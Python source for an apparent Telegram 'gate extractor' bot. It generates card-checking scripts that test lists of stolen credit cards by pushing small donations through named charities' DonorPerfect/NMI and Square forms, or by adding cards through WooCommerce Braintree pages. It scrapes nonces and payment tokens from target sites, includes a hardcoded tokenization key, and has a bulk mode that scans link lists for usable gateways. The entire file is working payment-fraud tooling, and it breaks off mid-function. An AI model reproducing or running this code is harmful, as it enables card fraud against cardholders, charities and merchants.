            headers=donate_headers,
            files=donate_files,
            timeout=60
        )

        return parse_donate_response(donate_resp.text)

    except Exception as e:
        return f'Error: {str(e)}'

if __name__ == '__main__':
    print()
    print('    Square Checker - andrewscenter.com')
    print()
    print()
    print('  [1] Single Card')
    print('  [2] Combo File')
    print()
    choice = input('  Select mode: ').strip()
    print()
    if choice == '1':
        card = input('  Enter card (cc|mm|yy|cvv): ').strip()
        result = check_card(card)
        print(f'  Result: {result}')
    elif choice == '2':
        fpath = input('  Enter file path: ').strip()
        if not os.path.exists(fpath):
            print('  File not found')
            return
        with open(fpath, 'r') as f:
            cards = [l.strip() for l in f if '|' in l]
        print(f'  Loaded {len(cards)} cards')
        print('  ------------------------------------')
        charged = 0
        declined = 0
        errors = 0
        for i, card in enumerate(cards, 1):
            result = check_card(card)
            status = 'CHARGED' if 'charged' in result.lower() else ('DECLINED' if any(x in result.lower() for x in ['declined', 'error', 'response']) else 'UNKNOWN')
            if status == 'CHARGED': charged += 1
            elif status == 'DECLINED': declined += 1
            else: errors += 1
            print(f'  [{i}/{len(cards)}] {card[:20]}... | {status} | {result}')
            time.sleep(1)
        print('  ------------------------------------')
        print(f'  Charged: {charged} | Declined: {declined} | Errors: {errors}')
    else:
        print('  Invalid choice')'''


def generate_nmi_code():
    return '''# DonorPerfect NMI Checker - facetscares.org
# Gateway: DonorPerfect + NMI
# Merchant: SafeSave
import requests, json, re, random, sys, os, time, uuid, threading
from datetime import datetime
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CONFIG = {
    'tokenization_key': 'CXdJAX-nKN8C7-Q6eeNT-5e28Jb',
    'org_id': '88aa1c4f-f78a-475a-a3ac-207d80e5985c',
    'form_id': '565434bc-5871-4b48-bfd3-c42b40481ef6',
    'form_name': 'FACETS Donation Form',
    'form_version': 1780674300494,
    'org_name': 'FACETS',
    'form_url': 'https://form-renderer-app.donorperfect.io/give/facets/facets-donation-form',
    'last_refresh': 0,
}
UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
LOCK = threading.Lock()
REFRESH_INTERVAL = 300

def full_refresh():
    try:
        r = requests.get(CONFIG['form_url'], headers={'User-Agent': UA}, timeout=20)
        html = r.text
        org_match = re.search(r'"organizationId"\\s*:\\s*"([a-f0-9-]+)"', html)
        if org_match:
            CONFIG['org_id'] = org_match.group(1)
        form_id_match = re.search(r'"formId"\\s*:\\s*"([a-f0-9-]+)"', html)
        if form_id_match:
            CONFIG['form_id'] = form_id_match.group(1)
        form_name_match = re.search(r'"formName"\\s*:\\s*"([^"]+)"', html)
        if form_name_match:
            CONFIG['form_name'] = form_name_match.group(1)
        form_ver_match = re.search(r'"version"\\s*:\\s*(\\d+)', html)
        if form_ver_match:
            CONFIG['form_version'] = int(form_ver_match.group(1))
        org_name_match = re.search(r'"organizationName"\\s*:\\s*"([^"]+)"', html)
        if org_name_match:
            CONFIG['org_name'] = org_name_match.group(1)
    except:
        pass
    try:
        gw = requests.get(
            f'https://form-renderer-api.donorperfect.io/api/gateway/organization/{CONFIG["org_id"]}',
            headers={'User-Agent': UA},
            timeout=15
        )
        gw_data = gw.json()
        new_key = gw_data.get('value', '') or gw_data.get('tokenizationKey', '')
        if new_key and isinstance(new_key, str):
            CONFIG['tokenization_key'] = new_key
    except:
        pass
    CONFIG['last_refresh'] = time.time()

def ensure_fresh():
    if time.time() - CONFIG['last_refresh'] > REFRESH_INTERVAL:
        with LOCK:
            if time.time() - CONFIG['last_refresh'] > REFRESH_INTERVAL:
                full_refresh()

def auto_refresh_loop():
    while True:
        time.sleep(REFRESH_INTERVAL)
        try:
            with LOCK:
                full_refresh()
        except:
            pass

full_refresh()
threading.Thread(target=auto_refresh_loop, daemon=True).start()

def classify_error(msg):
    msg_lower = msg.lower()
    if 'decline' in msg_lower or 'declined' in msg_lower:
        return f'Declined | {msg}'
    elif 'insufficient' in msg_lower:
        return f'Declined | INSUFFICIENT_FUNDS | {msg}'
    elif 'cvv' in msg_lower or 'cvc' in msg_lower or 'security code' in msg_lower:
        return f'Declined | CVV_FAILURE | {msg}'
    elif 'expired' in msg_lower:
        return f'Declined | EXPIRED_CARD | {msg}'
    elif 'invalid' in msg_lower and ('card' in msg_lower or 'number' in msg_lower):
        return f'Declined | INVALID_CARD | {msg}'
    elif 'do not honor' in msg_lower:
        return f'Declined | DO_NOT_HONOR | {msg}'
    elif 'fraud' in msg_lower:
        return f'Declined | SUSPECTED_FRAUD | {msg}'
    elif 'stolen' in msg_lower or 'lost' in msg_lower:
        return f'Declined | LOST_OR_STOLEN | {msg}'
    elif 'pickup' in msg_lower:
        return f'Declined | PICKUP_CARD | {msg}'
    elif 'limit' in msg_lower or 'exceed' in msg_lower:
        return f'Declined | EXCEED_LIMIT | {msg}'
    elif 'not permitted' in msg_lower:
        return f'Declined | TRANSACTION_NOT_PERMITTED | {msg}'
    elif 'account' in msg_lower and ('closed' in msg_lower or 'blocked' in msg_lower):
        return f'Declined | ACCOUNT_BLOCKED | {msg}'
    elif 'validation' in msg_lower:
        return f'Declined | VALIDATION_ERROR | {msg}'
    else:
        return f'Declined | {msg}'

def parse_response(resp):
    status_code = resp.status_code
    text = resp.text
    if status_code == 200:
        try:
            data = resp.json()
            if data.get('success') is True:
                return 'Charged | Donation succeeded'
            elif data.get('failure') is True or data.get('success') is False:
                err_obj = data.get('error', {})
                if isinstance(err_obj, dict):
                    err_msg = err_obj.get('message', '')
                    details = err_obj.get('details', {})
                    if isinstance(details, dict):
                        detail_msgs = list(details.values())
                        if detail_msgs:
                            err_msg = detail_msgs[0] if isinstance(detail_msgs[0], str) else json.dumps(detail_msgs[0])
                    if not err_msg:
                        err_msg = json.dumps(err_obj)[:200]
                else:
                    err_msg = str(err_obj)[:200]
                return classify_error(err_msg)
            elif 'confirmationCode' in str(data) or 'confirmation' in str(data).lower():
                return f'Charged | Donation confirmed | {json.dumps(data)[:200]}'
            else:
                return f'Charged | {json.dumps(data)[:200]}'
        except:
            if 'thank' in text.lower() or 'success' in text.lower():
                return 'Charged | Donation succeeded'
            return f'Response 200 | {text[:200]}'
    elif status_code == 400:
        try:
            data = resp.json()
            errors = data.get('errors', [])
            if isinstance(errors, list) and len(errors) > 0:
                err_msg = errors[0] if isinstance(errors[0], str) else json.dumps(errors[0])
            elif isinstance(data.get('message'), str):
                err_msg = data['message']
            elif isinstance(data.get('title'), str):
                err_msg = data['title']
            else:
                err_msg = json.dumps(data)[:200]
            return classify_error(err_msg)
        except:
            return f'Error 400 | {text[:200]}'
    elif status_code == 422:
        try:
            data = resp.json()
            errors = data.get('errors', data.get('validationErrors', []))
            if isinstance(errors, dict):
                all_errs = []
                for k, v in errors.items():
                    if isinstance(v, list):
                        all_errs.extend(v)
                    else:
                        all_errs.append(str(v))
                err_msg = '; '.join(all_errs) if all_errs else json.dumps(data)[:200]
            elif isinstance(errors, list) and len(errors) > 0:
                err_msg = errors[0] if isinstance(errors[0], str) else json.dumps(errors[0])
            else:
                err_msg = json.dumps(data)[:200]
            return classify_error(err_msg)
        except:
            return f'Validation Error | {text[:200]}'
    else:
        return f'HTTP {status_code} | {text[:200]}'

def check_card(ccx):
    try:
        ccx = ccx.strip()
        parts = ccx.split('|')
        if len(parts) < 4:
            return 'INVALID_FORMAT'
        cc, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        if len(yy) == 2:
            yy = '20' + yy
        ccexp_value = f'{mm}{yy[2:]}'

        ensure_fresh()
        tok_key = CONFIG['tokenization_key']
        cart_id = str(uuid.uuid4())

        nmi_headers = {
            'User-Agent': UA,
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://secure.nmi.com',
            'Referer': 'https://secure.nmi.com/',
        }

        create_resp = requests.post(
            'https://secure.nmi.com/token/api/create',
            headers=nmi_headers,
            data=f'tokenizationKey={tok_key}&cartCorrelationId={cart_id}',
            timeout=15
        )
        create_data = create_resp.json()
        token_id = create_data.get('token', '')
        if not token_id or not isinstance(token_id, str):
            return f'NMI Error | Could not create token'

        nmi_json_headers = {
            'User-Agent': UA,
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://secure.nmi.com',
            'Referer': 'https://secure.nmi.com/',
        }

        requests.post(
            'https://secure.nmi.com/token/api/save_multipart_token',
            headers=nmi_json_headers,
            json={
                'tokenizationKey': tok_key,
                'cartCorrelationId': cart_id,
                'tokenId': token_id,
                'data': [{'elementId': 'ccnumber', 'value': cc}]
            },
            timeout=15
        )

        requests.post(
            'https://secure.nmi.com/token/api/save_multipart_token',
            headers=nmi_json_headers,
            json={
                'tokenizationKey': tok_key,
                'cartCorrelationId': cart_id,
                'tokenId': token_id,
                'data': [{'elementId': 'ccexp', 'value': ccexp_value}]
            },
            timeout=15
        )

        requests.post(
            'https://secure.nmi.com/token/api/save_multipart_token',
            headers=nmi_json_headers,
            json={
                'tokenizationKey': tok_key,
                'cartCorrelationId': cart_id,
                'tokenId': token_id,
                'data': [{'elementId': 'cvv', 'value': cvv}]
            },
            timeout=15
        )

        lookup_resp = requests.post(
            'https://secure.nmi.com/token/api/lookup',
            headers=nmi_json_headers,
            json={
                'tokenizationKey': tok_key,
                'cartCorrelationId': cart_id,
                'tokenId': token_id
            },
            timeout=15
        )
        lookup_data = lookup_resp.json()
        card_info = lookup_data.get('card', {})
        if not card_info.get('number'):
            return f'NMI Error | Token lookup failed'

        email = f'donor{random.randint(100, 999)}@gmail.com'
        now_str = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')

        submission_payload = {
            'meta-data': {
                'formId': CONFIG['form_id'],
                'formVersion': CONFIG['form_version'],
                'formName': CONFIG['form_name'],
                'localDateTime': now_str,
                'hiddenFields': [],
                'organizationName': CONFIG['org_name'],
                'organizationId': CONFIG['org_id'],
            },
            'data': {
                'gift_amount': '1',
                'gift_type': 'oneTime',
                'first_name': 'John',
                'last_name': 'Smith',
                'email': email,
                'address': '123 Main St',
                'city': 'New York',
                'state': 'NY',
                'zip': '10001',
                'country': 'US',
                'phone': '',
                'employer': '',
                'payment_method': 'credit_card',
            },
            'payment-data': {
                'card': card_info,
                'token': token_id,
                'cartCorrelationId': cart_id,
                'check': lookup_data.get('check', {}),
            },
            'paypal-data': {},
        }

        submit_headers = {
            'User-Agent': UA,
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://form-renderer-app.donorperfect.io',
            'Referer': 'https://form-renderer-app.donorperfect.io/',
        }

        submit_resp = requests.post(
            'https://form-renderer-api.donorperfect.io/api/FormSubmission',
            headers=submit_headers,
            json=submission_payload,
            timeout=30
        )

        return parse_response(submit_resp)

    except Exception as e:
        return f'Error | {str(e)}'

if __name__ == '__main__':
    print('    DonorPerfect NMI Checker - facetscares.org')
    print(f'    Merchant: SafeSave')
    print()
    print('  [1] Single Card')
    print('  [2] Combo File')
    print()
    choice = input('  Select mode: ').strip()
    print()
    if choice == '1':
        card = input('  Enter card (cc|mm|yy|cvv): ').strip()
        result = check_card(card)
        print(f'  Result: {result}')
    elif choice == '2':
        fpath = input('  Enter file path: ').strip()
        if not os.path.exists(fpath):
            print('  File not found')
            return
        with open(fpath, 'r') as f:
            cards = [l.strip() for l in f if '|' in l]
        print(f'  Loaded {len(cards)} cards')
        print('  ------------------------------------')
        charged = 0
        declined = 0
        errors = 0
        for i, card in enumerate(cards, 1):
            result = check_card(card)
            status = 'CHARGED' if 'charged' in result.lower() else ('DECLINED' if any(x in result.lower() for x in ['declined', 'error', 'response']) else 'UNKNOWN')
            if status == 'CHARGED': charged += 1
            elif status == 'DECLINED': declined += 1
            else: errors += 1
            print(f'  [{i}/{len(cards)}] {card[:20]}... | {status} | {result}')
            time.sleep(1)
        print('  ------------------------------------')
        print(f'  Charged: {charged} | Declined: {declined} | Errors: {errors}')
    else:
        print('  Invalid choice')'''


def generate_braintree_code(link, nonce, auth, merchant_id, braintree_client_id):
    return f'''# Braintree Gateway
# Link: {link}
import requests
import json
import base64
import re
import time
from user_agent import generate_user_agent

def check_braintree_card(card_data):
    link = "{link}"
    user = generate_user_agent()
    r = requests.Session()
    
    headers = {{'User-Agent': user}}
    
    res = r.get(f"{{link}}/my-account/add-payment-method/", headers=headers)
    if res.status_code == 404:
        res = r.get(f"{{link}}/add-payment-method/", headers=headers)
    
    if res.status_code != 200:
        return f"Site error: {{res.status_code}}"
    
    html = res.text
    
    nonce_match = re.search(r'name="_wpnonce" value="(.*?)"', html)
    if not nonce_match:
        nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', html)
    if not nonce_match:
        return "No nonce found ⚠️"
    nonce = nonce_match.group(1)
    
    client_token_match = re.search(r'var wc_braintree_client_token[=:]\\s*"([^"]+)"', html)
    if not client_token_match:
        client_token_match = re.search(r'"clientToken":"([^"]+)"', html)
    if not client_token_match:
        return "No client token found ⚠️"
    
    client_token = client_token_match.group(1)
    decoded = base64.b64decode(client_token).decode('utf-8')
    auth_match = re.search(r'"authorizationFingerprint":"([^"]+)"', decoded)
    if not auth_match:
        return "No authorization fingerprint found ⚠️"
    auth = auth_match.group(1)
    
    merchant_match = re.search(r'"merchantId":"([^"]+)"', decoded)
    merchant_id = merchant_match.group(1) if merchant_match else None
    
    parts = card_data.split('|')
    if len(parts) >= 4:
        number = parts[0]
        month = parts[1].zfill(2)
        year = parts[2]
        cvc = parts[3]
        if len(year) == 4:
            year = year[2:]
    else:
        return "Invalid card format ⚠️"
    
    url = "https://payments.braintree-api.com/graphql"
    
    payload = json.dumps({{
        "clientSdkMetadata": {{
            "source": "client",
            "integration": "custom",
            "sessionId": "36a1b375-edba-401d-917e-41dfe8184bdf"
        }},
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {{   tokenizeCreditCard(input: $input) {{     token     creditCard {{       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {{         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }}     }}   }} }}",
        "variables": {{
            "input": {{
                "creditCard": {{
                    "number": number,
                    "expirationMonth": month,
                    "expirationYear": "20"+year,
                    "cvv": cvc
                }},
                "options": {{
                    "validate": False
                }}
            }}
        }},
        "operationName": "TokenizeCreditCard"
    }})
    
    headers2 = {{
        'User-Agent': user,
        'Content-Type': "application/json",
        'authorization': f"Bearer {{auth}}",
        'braintree-version': "2018-05-10",
        'origin': "https://assets.braintreegateway.com",
        'referer': "https://assets.braintreegateway.com/",
    }}
    
    response = r.post(url, data=payload, headers=headers2)
    
    if response.status_code != 200:
        return f"Tokenization failed: {{response.status_code}}"
    
    result = response.json()
    if 'data' not in result or 'tokenizeCreditCard' not in result['data']:
        return f"Error: {{result.get('errors', [{{}}])[0].get('message', 'Unknown')}}"
    
    token = result['data']['tokenizeCreditCard']['token']
    
    headers3 = {{
        'User-Agent': user,
        'Content-Type': 'application/x-www-form-urlencoded',
        'origin': link,
        'referer': f'{{link}}/my-account/add-payment-method/',
    }}
    
    data = {{
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': token,
        'braintree_cc_device_data': '',
        'braintree_cc_3ds_nonce_key': '',
        'braintree_cc_config_data': '{{"environment":"production","merchantId":"{merchant_id}"}}' if merchant_id else '',
        '_wpnonce': nonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }}
    
    response = r.post(f'{{link}}/my-account/add-payment-method/', headers=headers3, data=data)
    
    if 'Payment method successfully added' in response.text or 'success' in response.text.lower():
        return "✅ Payment method added successfully"
    elif 'declined' in response.text.lower():
        return "❌ Declined"
    else:
        return f"⚠️ {{response.text[:100]}}"

if __name__ == '__main__':
    print('Braintree Card Checker')
    print('Link: {link}')
    print('-'*40)
    while True:
        card = input('Enter Card (number|month|year|cvv): ')
        result = check_braintree_card(card)
        print(f'Response: {{result}}')
        time.sleep(2)'''


# ============================================
# === أمر سحب PayPal ===
# ============================================
@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
def paypal_extract(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you.')
        return

    ko = bot.send_message(message.chat.id, "- The PayPal gate is being withdrawn ...")
    
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) != 2:
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text='''- Please send the link like this:\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>''', parse_mode="HTML")
            return

        link = parts[1].strip()

        if not link.startswith(("http://", "https://")):
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text="Invalid link format ❌", parse_mode="HTML")
            return

        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        if r.status_code != 200:
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text=f"Site returned status: {r.status_code} ❌")
            return

        bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text="Gate found ✅ Extracting data...")

    except Exception as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")
        return

    try:
        user = generate_user_agent()
        r = requests.Session()
        headers = {'user-agent': user}
        res = r.get(url=f"{link}", headers=headers, timeout=15).text
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res).group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res).group(1)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', res).group(1)
        anc = re.search(r'"data-client-token":"(.*?)"', res)
        if anc:
            enc = re.search(r'"data-client-token":"(.*?)"', res).group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        else:
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text='''Data Client Token not found ⚠️''', parse_mode="HTML")
            return
    except Exception as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text=f'''Error extracting data ❌\n<code>{str(e)[:100]}</code>''', parse_mode="HTML")
        return

    code = generate_paypal_code(link, id_form1, id_form2, nonec, au)

    file_name = f'@nnunrr_paypal_{message.from_user.id}.py'
    with open(file_name, "w", encoding="utf-8") as f:
        f.write(code)
    with open(file_name, "rb") as f:
        bot.send_document(
            chat_id=message.chat.id,
            document=f,
            caption=f'''The PayPal gate was successfully withdrawn ✅
━━━━━━━━━━━━━━━━━━━━
<strong>Gateway information ...</strong>

Link: <code>{link}</code>
id form: <code>{id_form1}</code>
id form2: <code>{id_form2}</code>
nonce: <code>{nonec}</code>
client token: <code>{au[:50]}...</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr''',
            parse_mode="HTML"
        )
    os.remove(file_name)


# ============================================
# === أمر سحب Stripe ===
# ============================================
@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/stripe'))
def stripe_extract(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you.')
        return

    ko = bot.send_message(message.chat.id, "- The Stripe gate is being withdrawn ...")
    
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) != 2:
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text='''- Please send the link like this:\n\n<code>/stripe https://xxxxxxx.xxx/xxxx</code>''', parse_mode="HTML")
            return

        link = parts[1].strip()

        if not link.startswith(("http://", "https://")):
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text="Invalid link format ❌", parse_mode="HTML")
            return

        bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text="Gate found ✅ Extracting data...")

    except Exception as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")
        return

    try:
        code = generate_stripe_code(link)
        file_name = f'@nnunrr_stripe_{message.from_user.id}.py'
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(code)
        with open(file_name, "rb") as f:
            bot.send_document(
                chat_id=message.chat.id,
                document=f,
                caption=f'''The Stripe gate was successfully withdrawn ✅
━━━━━━━━━━━━━━━━━━━━
<strong>Gateway information ...</strong>

Link: <code>{link}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr''',
                parse_mode="HTML"
            )
        os.remove(file_name)
    except Exception as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")


# ============================================
# === أمر سحب Square ===
# ============================================
@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/square'))
def square_extract(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you.')
        return

    ko = bot.send_message(message.chat.id, "- The Square gate is being withdrawn ...")
    
    try:
        code = generate_square_code()
        file_name = f'@nnunrr_square_{message.from_user.id}.py'
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(code)
        with open(file_name, "rb") as f:
            bot.send_document(
                chat_id=message.chat.id,
                document=f,
                caption=f'''The Square gate was successfully withdrawn ✅
━━━━━━━━━━━━━━━━━━━━
<strong>Gateway information ...</strong>

Site: andrewscenter.com
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr''',
                parse_mode="HTML"
            )
        os.remove(file_name)
    except Exception as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")


# ============================================
# === أمر سحب NMI ===
# ============================================
@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/nmi'))
def nmi_extract(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you.')
        return

    ko = bot.send_message(message.chat.id, "- The NMI gate is being withdrawn ...")
    
    try:
        code = generate_nmi_code()
        file_name = f'@nnunrr_nmi_{message.from_user.id}.py'
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(code)
        with open(file_name, "rb") as f:
            bot.send_document(
                chat_id=message.chat.id,
                document=f,
                caption=f'''The NMI gate was successfully withdrawn ✅
━━━━━━━━━━━━━━━━━━━━
<strong>Gateway information ...</strong>

Site: facetscares.org
Merchant: SafeSave
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr''',
                parse_mode="HTML"
            )
        os.remove(file_name)
    except Exception as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")


# ============================================
# === أمر سحب Braintree ===
# ============================================
@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/braintree'))
def braintree_extract(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you.')
        return

    ko = bot.send_message(message.chat.id, "- The Braintree gate is being withdrawn ...")
    
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) != 2:
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text='''- Please send the link like this:\n\n<code>/braintree https://xxxxxxx.xxx</code>''', parse_mode="HTML")
            return

        link = parts[1].strip()

        if not link.startswith(("http://", "https://")):
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text="Invalid link format ❌", parse_mode="HTML")
            return

        bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text="Gate found ✅ Extracting data...")

        session = requests.Session()
        user = generate_user_agent()
        headers = {'user-agent': user}
        
        res = session.get(f"{link}/my-account/add-payment-method/", headers=headers, timeout=15)
        if res.status_code == 404:
            res = session.get(f"{link}/add-payment-method/", headers=headers, timeout=15)
        if res.status_code == 404:
            res = session.get(f"{link}/payment-method/", headers=headers, timeout=15)
        
        if res.status_code != 200:
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text=f"Site returned status: {res.status_code} ❌")
            return
        
        html_text = res.text
        
        nonce_match = re.search(r'name="_wpnonce" value="(.*?)"', html_text)
        if not nonce_match:
            nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', html_text)
        
        nonce = nonce_match.group(1) if nonce_match else None
        
        client_token_match = re.search(r'var wc_braintree_client_token[=:]\s*"([^"]+)"', html_text)
        if not client_token_match:
            client_token_match = re.search(r'"clientToken":"([^"]+)"', html_text)
        
        auth = None
        merchant_id = None
        braintree_client_id = None
        
        if client_token_match:
            client_token = client_token_match.group(1)
            try:
                decoded = base64.b64decode(client_token).decode('utf-8')
                auth_match = re.search(r'"authorizationFingerprint":"([^"]+)"', decoded)
                if auth_match:
                    auth = auth_match.group(1)
                
                merchant_match = re.search(r'"merchantId":"([^"]+)"', decoded)
                if merchant_match:
                    merchant_id = merchant_match.group(1)
                
                client_id_match = re.search(r'"braintreeClientId":"([^"]+)"', decoded)
                if client_id_match:
                    braintree_client_id = client_id_match.group(1)
            except:
                pass
        
        if not auth:
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text="No Braintree authorization token found ⚠️")
            return

        code = generate_braintree_code(link, nonce, auth, merchant_id, braintree_client_id)

        file_name = f'@nnunrr_braintree_{message.from_user.id}.py'
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(code)
        with open(file_name, "rb") as f:
            bot.send_document(
                chat_id=message.chat.id,
                document=f,
                caption=f'''The Braintree gate was successfully withdrawn ✅
━━━━━━━━━━━━━━━━━━━━
<strong>Gateway information ...</strong>

Link: <code>{link}</code>
Merchant ID: <code>{merchant_id or 'Not found'}</code>
Authorization: <code>{auth[:50]}...</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr''',
                parse_mode="HTML"
            )
        os.remove(file_name)

    except Exception as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")


# ============================================
# === أمر bulk - يدعم كل البوابات ===
# ============================================
@bot.message_handler(commands=['bulk'])
def bulk_extract_start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you.')
        return

    user_id = message.from_user.id
    bulk_waiting[user_id] = True
    msg = bot.reply_to(message, """📁 <b>Bulk Mode Active</b>
━━━━━━━━━━━━━━━━━━
Send .txt files (one link per line)
You can send multiple files

<b>Supported Gateways:</b>
🔵 PayPal
🟢 Stripe
🟠 Square
🟣 NMI
🔴 Braintree

<b>Commands:</b>
🛑 /stop [number] - Stop a specific file
🛑 /stop - Stop all files
✅ /done - End bulk mode
━━━━━━━━━━━━━━━━━━""", parse_mode="HTML")

@bot.message_handler(commands=['stop'])
def stop_bulk_file(message):
    user_id = message.from_user.id
    try:
        parts = message.text.split()
        if len(parts) > 1:
            file_num = int(parts[1])
            if user_id in stop_flags and file_num in stop_flags[user_id]:
                stop_flags[user_id][file_num] = True
                bot.reply_to(message, f"🛑 Stopping File #{file_num}...")
            else:
                bot.reply_to(message, f"❌ File #{file_num} not found.")
        else:
            if user_id in stop_flags:
                for key in stop_flags[user_id]:
                    stop_flags[user_id][key] = True
                bot.reply_to(message, "🛑 Stopping all files...")
            else:
                bot.reply_to(message, "❌ No active files to stop.")
    except:
        bot.reply_to(message, "Usage: /stop [file_number]")

@bot.message_handler(commands=['done'])
def bulk_done(message):
    user_id = message.from_user.id
    if user_id in bulk_waiting:
        del bulk_waiting[user_id]
        if user_id in stop_flags:
            for key in stop_flags[user_id]:
                stop_flags[user_id][key] = True
            del stop_flags[user_id]
        bot.reply_to(message, "✅ Bulk mode ended.")
    else:
        bot.reply_to(message, "You are not in bulk mode.")

@bot.message_handler(content_types=['document'])
def handle_bulk_file(message):
    user_id = message.from_user.id
    if user_id in bulk_waiting:
        threading.Thread(target=process_bulk_file, args=(message,)).start()
    else:
        bot.reply_to(message, "Use /bulk first to start bulk extraction.")

def process_bulk_file(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not message.document:
        bot.reply_to(message, "❌ Please send a .txt file.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        links = downloaded_file.decode('utf-8').splitlines()
        links = [link.strip() for link in links if link.strip()]

        if not links:
            bot.reply_to(message, "❌ File is empty.")
            return

        total = len(links)
        
        if user_id not in stop_flags:
            stop_flags[user_id] = {}
        file_num = len(stop_flags[user_id]) + 1
        stop_flags[user_id][file_num] = False
        
        processing_status[f"{user_id}_{file_num}"] = {
            'total': total,
            'processed': 0,
            'live': 0,
            'dead': 0,
            'lock': threading.Lock()
        }
        
        status_msg = bot.reply_to(message, f"""📊 <b>File #{file_num} - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: 0
❌ Dead: 0
⏳ Progress: 0%
━━━━━━━━━━━━━━━━━━
🛑 /stop {file_num} to stop this file""", parse_mode="HTML")
        
        live_count = 0
        
        def extract_paypal_data(link, session):
            try:
                r = session.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
                if r.status_code != 200:
                    return None
                res = r.text
                id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
                id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res)
                nonec = re.search(r'name="give-form-hash" value="(.*?)"', res)
                anc = re.search(r'"data-client-token":"(.*?)"', res)
                
